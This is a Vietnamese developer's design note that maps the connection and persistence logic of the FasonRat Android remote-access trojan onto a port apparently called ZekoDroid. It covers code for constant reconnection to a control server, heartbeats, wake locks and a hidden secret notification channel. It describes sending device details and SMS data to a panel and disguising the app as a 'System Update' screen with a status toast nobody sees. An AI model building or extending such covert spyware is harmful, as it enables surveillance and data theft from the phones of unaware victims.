# Logic kết nối — đối chiếu FasonRat

Nguồn tham khảo (đọc trực tiếp từ repo):
`fason/app/src/main/java/com/fason/app/core/network/SocketClient.java`
`fason/app/src/main/java/com/fason/app/service/MainService.java`

## FasonRat làm gì

```java
IO.Options opts = new IO.Options();
opts.reconnection = true;
opts.reconnectionAttempts = 10000;
opts.reconnectionDelay = 5000;       // 5s
opts.reconnectionDelayMax = 60000;   // 60s
opts.timeout = 30000;
opts.query = "model=…&manf=…&release=…&id=ANDROID_ID";
opts.auth = {"token": deviceSecret};
```

```java
// có mạng lại -> connect ngay sau 1s
ConnectivityManager.NetworkCallback() {
  onAvailable(Network n) { handler.postDelayed(() -> socket.connect(), 1000); }
}
```

```java
// MainService
startForeground(NOTIF_ID, notif, currentType);   // khai báo type, catch rồi fallback
acquireWakeLock(PARTIAL_WAKE_LOCK);
registerReceiver(screenStateReceiver, …);
NotificationChannel ch = new NotificationChannel(id, ".", IMPORTANCE_MIN);
ch.setLockscreenVisibility(VISIBILITY_SECRET);
```

## ZekoDroid port sang (protocol TCP thô + JSON, không Socket.IO)

| Cơ chế FasonRat | ZekoDroid | File |
|---|---|---|
| `onAvailable` → connect lại | `ConnectivityManager.NetworkCallback` → `forceReconnect=true` + `socket.close()` → vòng retry thoát ngay (không đợi hết backoff) | `Core.java` |
| `reconnectionDelay 5s → max 60s` | `backoff = 5s`, mỗi lần fail `×2` tới `60s` + jitter 0–2s | `Core.java` |
| `timeout 30000` | `CONNECT_TIMEOUT_MS = 20000` cho `socket.connect()` | `Core.java` |
| Socket.IO ping/pong (25s/20s) | `heartbeat` thread: gửi `{"t":"ping"}` mỗi **25s**, quá **50s** không `pong` → đóng socket, reconnect | `Core.java` |
| `startForeground(notif, type)` + fallback | `startForegroundSafe()`: API 29+ dùng `FOREGROUND_SERVICE_TYPE_DATA_SYNC`, catch rồi fallback `startForeground(1, n)` | `Core.java` |
| `PARTIAL_WAKE_LOCK` | `acquireWakeLock()` / release trong `onDestroy` | `Core.java` |
| channel `IMPORTANCE_MIN` + `VISIBILITY_SECRET` | đã có từ trước, giữ nguyên | `Core.java` |
| server phát hiện client chết | `SweepAsync`: 30s quét, session im lặng > **150s** → đóng | `Hub.cs` |
| `query` gửi model/manf/id | `hello.info` gửi host/user/os/arch/cpu/ram/ip/… | `Core.java` |
| `auth.token` (device secret) | `psk` trong `assets/zk.conf` → AES-256-GCM; lệch PSK thì fallback plaintext + log cảnh báo | `Proto.java`, `Hub.cs` |

## Khác biệt có chủ đích

- FasonRat dùng Socket.IO (transport fallback polling↔websocket, tự xử lý handshake). ZekoDroid dùng TCP thô nên phải tự làm: khung 4-byte + heartbeat + sweep.
- FasonRat không mã hoá payload (chỉ TLS nếu `secure`). ZekoDroid có AES-256-GCM tuỳ chọn, và có đường lùi plaintext khi PSK lệch để không bị "im lặng".

## Kiểm chứng

```
server psk=on, agent gửi plaintext  -> vẫn online, info/sms trả dữ liệu (có log cảnh báo)
server psk=off, agent plaintext     -> online bình thường
heartbeat 25s                       -> agent không bị sweep đóng sau 150s
```
## Xem trạng thái mà không lộ ra màn hình

- `adb logcat -s sysupd` → thấy `connected`, `handshake ok`, `net: ...`
- Màn hình cài đặt: **giữ lâu vào tiêu đề "System Update"** → hiện toast trạng thái (không ai thấy nếu không biết)
- Panel: tab Info → lệnh `status`